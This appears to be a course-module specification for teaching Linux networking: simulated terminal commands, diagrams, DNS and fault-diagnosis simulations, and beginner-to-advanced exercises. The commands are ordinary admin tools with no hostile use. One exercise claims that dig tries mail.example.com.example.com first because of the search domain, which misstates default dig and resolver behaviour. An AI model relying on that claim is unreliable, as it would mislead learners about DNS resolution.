**Required Interactive Components:** TerminalSimulator (ip addr show, ip link show, ip addr add, ip addr del, ip route show, ip route add default, ip link set dev eth0 up, ip link set dev eth0 down, ip -s link, nmcli device status, cat /etc/netplan/01-netcfg.yaml, sudo netplan apply, cat /etc/resolv.conf, cat /etc/nsswitch.conf, cat /etc/hosts, hostnamectl, hostnamectl set-hostname, dig, dig @1.1.1.1, dig +short, dig +trace, nslookup, host, resolvectl status, ping -c 4, ping -c 4 -W 2, traceroute, traceroute -n, mtr -n, ss -tlnp, ss -s, ss -4s, netstat -tlnp, tcpdump -i eth0, tcpdump -i eth0 -c 20, tcpdump -i eth0 'port 22', tcpdump -i eth0 -w /tmp/capture.pcap, scp user@host:file ., rsync -avz --delete src/ dest/, wget -c, curl -s, curl -I, curl -v, curl -o), ClickableDiagram (Linux network stack: application socket → kernel TCP/IP stack → net driver → NIC → wire — with ip command scope annotations per layer), ComparisonTable (scp vs. rsync vs. wget vs. curl — protocol/encryption/resume capability/rate limiting/primary use case), QuizWidget
**Animation Categories:** ip-addr-show-field-decode, interface-flags-lower-up-meaning, netplan-yaml-to-kernel-apply-sequence, resolv-conf-search-domain-appending, dig-output-section-anatomy, tcpdump-packet-output-field-decode, rsync-delta-transfer-only-changed-blocks
**Simulations:** Network fault diagnosis (interface down → wrong IP → missing default route → DNS misconfiguration — learner executes the 5-step sequence and identifies the failure layer); DNS resolution path explorer (enter hostname → system resolves via /etc/hosts first, then /etc/resolv.conf, then recursive resolver — each step visible)
**Assessment Strategy:** Quiz-only for L1 and L2; quiz-and-challenge for L3 and L4

**Practical Progression:**
- **Beginner:** Run `ip addr show` and `ip route show`; identify the interface name, IP address with prefix length, and default gateway; explain what the `LOWER_UP` flag in the interface output indicates about link state
- **Intermediate:** Edit /etc/resolv.conf to set nameserver 1.1.1.1 and search domain example.com; run `dig mail.example.com` and explain why the search domain caused the resolver to try mail.example.com.example.com first
- **Advanced:** On a simulated host with a broken network, execute the 5-step diagnostic (ip addr → ip route → ping gateway → dig hostname → ping destination) and identify at which layer the failure occurs
- **Capstone:** Not applicable at module level
